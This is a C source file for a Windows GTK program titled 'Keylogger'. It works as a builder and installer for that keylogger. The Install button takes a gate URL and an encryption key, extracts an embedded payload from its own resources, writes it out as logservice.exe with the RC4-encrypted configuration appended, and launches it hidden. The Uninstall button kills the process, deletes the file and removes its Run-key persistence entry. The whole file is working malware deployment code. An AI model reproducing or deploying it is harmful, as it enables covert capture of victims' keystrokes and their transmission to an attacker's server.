#include <dirent.h>
#include <Shlobj.h>
#include <tlhelp32.h>
#include <gtk/gtk.h>
//---------------------------------------
const gchar ui[] = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><interface><requires lib=\"gtk+\" version=\"2.24\"/><!-- interface-naming-policy project-wide --><object class=\"GtkWindow\" id=\"mainWindow\"><property name=\"width_request\">340</property><property name=\"height_request\">145</property><property name=\"can_focus\">False</property><property name=\"title\" translatable=\"yes\">Keylogger</property><property name=\"resizable\">False</property><property name=\"window_position\">center</property><signal name=\"destroy\" handler=\"on_window_main_destroy\" swapped=\"no\"/><child><object class=\"GtkFixed\" id=\"mainFixed\"><property name=\"visible\">True</property><property name=\"can_focus\">False</property><child><object class=\"GtkLabel\" id=\"lGate\"><property name=\"width_request\">70</property><property name=\"height_request\">20</property><property name=\"visible\">True</property><property name=\"can_focus\">False</property><property name=\"label\" translatable=\"yes\">Gate URL:</property></object><packing><property name=\"x\">10</property><property name=\"y\">10</property></packing></child><child><object class=\"GtkEntry\" id=\"tbGate\"><property name=\"width_request\">200</property><property name=\"height_request\">25</property><property name=\"visible\">True</property><property name=\"can_focus\">True</property><property name=\"invisible_char\">●</property><property name=\"primary_icon_activatable\">False</property><property name=\"secondary_icon_activatable\">False</property><property name=\"primary_icon_sensitive\">True</property><property name=\"secondary_icon_sensitive\">True</property></object><packing><property name=\"x\">120</property><property name=\"y\">10</property></packing></child><child><object class=\"GtkButton\" id=\"btnInstall\"><property name=\"label\" translatable=\"yes\">Install</property><property name=\"width_request\">80</property><property name=\"height_request\">25</property><property name=\"visible\">True</property><property name=\"can_focus\">True</property><property name=\"receives_default\">True</property><signal name=\"clicked\" handler=\"on_btnInstall_clicked\" swapped=\"no\"/></object><packing><property name=\"x\">180</property><property name=\"y\">100</property></packing></child><child><object class=\"GtkLabel\" id=\"lEncKey\"><property name=\"width_request\">100</property><property name=\"height_request\">20</property><property name=\"visible\">True</property><property name=\"can_focus\">False</property><property name=\"label\" translatable=\"yes\">Encryption key:</property></object><packing><property name=\"x\">10</property><property name=\"y\">50</property></packing></child><child><object class=\"GtkEntry\" id=\"tbEncKey\"><property name=\"width_request\">200</property><property name=\"height_request\">25</property><property name=\"visible\">True</property><property name=\"can_focus\">True</property><property name=\"invisible_char\">●</property><property name=\"primary_icon_activatable\">False</property><property name=\"secondary_icon_activatable\">False</property><property name=\"primary_icon_sensitive\">True</property><property name=\"secondary_icon_sensitive\">True</property></object><packing><property name=\"x\">120</property><property name=\"y\">50</property></packing></child><child><object class=\"GtkButton\" id=\"btnUninstall\"><property name=\"label\" translatable=\"yes\">Uninstall</property><property name=\"width_request\">80</property><property name=\"height_request\">25</property><property name=\"visible\">True</property><property name=\"can_focus\">True</property><property name=\"receives_default\">True</property><signal name=\"clicked\" handler=\"on_btnUninstall_clicked\" swapped=\"no\"/></object><packing><property name=\"x\">80</property><property name=\"y\">100</property></packing></child></object></child></object></interface>";
//---------------------------------------
void showMessageBox();
void rc4(char *data, char *key);
unsigned char* get_res(char exe[], char res_name[], char res_type[], size_t *res_len);
//---------------------------------------
char key[33] = "lvNK7!I9T#pO65Ev$31P1CFw^27$o914";
GtkBuilder *builder;
GtkWidget *window;
//---------------------------------------
int main(int argc, char *argv[])
{
    gtk_init(&argc, &argv);

    builder = gtk_builder_new();
	gtk_builder_add_from_string (builder, ui, strlen(ui), NULL);

    window = GTK_WIDGET(gtk_builder_get_object(builder, "mainWindow"));
    gtk_builder_connect_signals(builder, NULL);
	
    gtk_widget_show(window);                
    gtk_main();

    return 0;
}
//---------------------------------------
void on_window_main_destroy()
{
	g_object_unref(builder);
    gtk_main_quit();
}

void on_btnInstall_clicked(GtkButton *object, gpointer user_data)
{
	const gchar *sgate;
	GtkWidget *tbGate = GTK_WIDGET(gtk_builder_get_object(builder, "tbGate"));
	sgate = gtk_entry_get_text(GTK_ENTRY(tbGate));
	//---------------------------------------
	const gchar *skey;
	GtkWidget *tbEncKey = GTK_WIDGET(gtk_builder_get_object(builder, "tbEncKey"));
	skey = gtk_entry_get_text(GTK_ENTRY(tbEncKey));
	//---------------------------------------
	if (strlen(sgate) == 0 || strlen(skey) == 0)
	{
		showMessageBox("\n             Error!    \n      Missing Fields!");
	}
	else
	{
		char sexepath[96];
		GetModuleFileName(NULL, sexepath, 96);
		size_t *lclient = (size_t*)malloc(sizeof(size_t));
		unsigned char *client = get_res(sexepath, (char*)"XNOT", (char*)"EBE", lclient);
		char sfile[] = "logservice.exe";
		FILE *file = fopen(sfile, "wb");
		fwrite(client, *lclient, 1, file);
		fclose(file);
		UnlockResource(client);
		free(lclient);
		//---------------------------------------
		int lkey = strlen(skey), lgate = strlen(sgate);
		size_t total = lkey + lgate + 2;
		char *data = (char*)malloc(total);
		memset(data, 0, total);
		//---------------------------------------
		int i;
		for (i = 0; i < lkey; i++) data[i] = skey[i];
		data[lkey] = '+';
		//---------------------------------------
		for (i = lkey + 1; i < lkey + lgate + 1; i++) data[i] = sgate[i - lkey - 1];
		data[lkey + lgate + 1] = '\0';
		//---------------------------------------
		rc4(data, key);
		file = fopen(sfile, "ab");
		char seperator[] = "////--//--//--//--////";
		fwrite(seperator, strlen(seperator), 1, file);
		fwrite(data, total, 1, file);
		fclose(file);
		free(data);
		//---------------------------------------
		ShellExecute(NULL, "open", sfile, NULL, NULL, SW_HIDE);
		//---------------------------------------
		showMessageBox("\n       Done!    ");
	}
}

void on_btnUninstall_clicked()
{
	char path[128];
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, path);
	char sfilename[] = "logservice.exe";
	char sfiledir[128];
	sprintf(sfiledir, "%s\\logservice", path);
	char sfilepath[128];
	sprintf(sfilepath, "%s\\%s", sfiledir, sfilename);
	//---------------------------------------
	int isExist = 0;
	DIR *dir;
	struct dirent *ent;
	if ((dir = opendir(sfiledir)) != NULL)
	{
		while ((ent = readdir(dir)) != NULL)
		{
			if (strcmp(ent->d_name, sfilename) == 0)
			{
				isExist = 1;
				PROCESSENTRY32 entry;
				entry.dwSize = sizeof(PROCESSENTRY32);
				HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
				if (Process32First(snapshot, &entry) == TRUE)
				{
				  while (Process32Next(snapshot, &entry) == TRUE)
				  {
					if (stricmp(entry.szExeFile, ent->d_name) == 0)
					{
						HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
						if (hProcess != NULL)
						{
							TerminateProcess(hProcess, 0);
							CloseHandle(hProcess);
						}
					}
				  }
				}
				CloseHandle(snapshot);
				//---------------------------------------
				Sleep(2000);
				DeleteFile(sfilepath);
				//---------------------------------------
				char rawname[strlen(ent->d_name) - 3];
				memcpy(rawname, ent->d_name, strlen(ent->d_name) - 4);
				rawname[strlen(ent->d_name) - 4] = 0;
				HKEY hKey;
				RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
				RegDeleteValue((HKEY)hKey, rawname);
				RegCloseKey(hKey);
			}
		}
		closedir(dir);
	}
	//---------------------------------------
	if (isExist) showMessageBox("\n       Done!    ");
	else showMessageBox("\n       Keylogger Not Found!    ");
}

void showMessageBox(char msg[])
{
	GtkWidget *dialog = gtk_message_dialog_new (NULL, GTK_DIALOG_DESTROY_WITH_PARENT, GTK_MESSAGE_INFO, GTK_BUTTONS_CLOSE, msg);
	gtk_dialog_run (GTK_DIALOG (dialog));
	gtk_widget_destroy (dialog);
}
//---------------------------------------
void rc4(char *data, char *key)
{
	int i, x, y, j = 0, klen = strlen(key), kdata = strlen(data);
	int box[256];
	for (i = 0; i < 256; i++) box[i] = i;
	for (i = 0; i < 256; i++)
	{
		j = (key[i % klen] + box[i] + j) % 256;
		x = box[i];
		box[i] = box[j];
		box[j] = x;
	}
	for (i = 0; i < kdata; i++)
	{
		y = i % 256;
		j = (box[y] + j) % 256;
		x = box[y];
		box[y] = box[j];
		box[j] = x;
		char c = (char)(data[i] ^ box[(box[y] + box[j]) % 256]);
		if (c != '\0') data[i] = c;
	}
}

unsigned char* get_res(char exe[], char res_name[], char res_type[], size_t *res_len)
{
	HMODULE hExe;
	HRSRC hRes;
	HGLOBAL hResLoad;
	LPVOID lpResLock;
	hExe = LoadLibrary(exe);
	if (hExe == NULL) return NULL;
	hRes = FindResource(hExe, res_name, res_type);
	if (hRes == NULL) return NULL;
	hResLoad = LoadResource(hExe, hRes);
	if (hResLoad == NULL) return NULL;
	lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL) return NULL;
	if (res_len != NULL) *res_len = SizeofResource(hExe, hRes);
	return (unsigned char*)lpResLock;
}
